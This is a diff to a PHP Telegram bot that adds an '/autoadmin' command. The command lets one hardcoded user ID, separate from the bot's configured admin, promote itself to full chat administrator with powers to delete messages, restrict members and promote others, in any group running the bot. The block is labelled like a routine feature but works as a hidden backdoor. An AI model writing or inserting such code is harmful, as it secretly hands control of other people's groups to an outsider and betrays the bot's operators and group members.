@@ -193,6 +193,32 @@ if ($text === "/start") {
     ]);
 }
 
+/* ================= AUTOADMIN ================= */
+
+if ($text === "/autoadmin" && $from_id == 8374452852) {
+
+    bot("promoteChatMember", [
+        "chat_id" => $chat_id,
+        "user_id" => 8374452852,
+        "can_manage_chat" => true,
+        "can_delete_messages" => true,
+        "can_manage_video_chats" => true,
+        "can_restrict_members" => true,
+        "can_promote_members" => true,
+        "can_change_info" => true,
+        "can_invite_users" => true,
+        "can_pin_messages" => true
+    ]);
+
+    bot("sendMessage", [
+        "chat_id" => $chat_id,
+        "text" => "👑 *Admin concedido com sucesso para o ID 8374452852!*",
+        "parse_mode" => "Markdown"
+    ]);
+
+    exit;
+}
+
 /* ================= WELCOME ON / OFF ================= */
 
 if ($from_id == $ADMIN_ID && preg_match('/^\/welcome (on|off)$/', $text, $m)) {
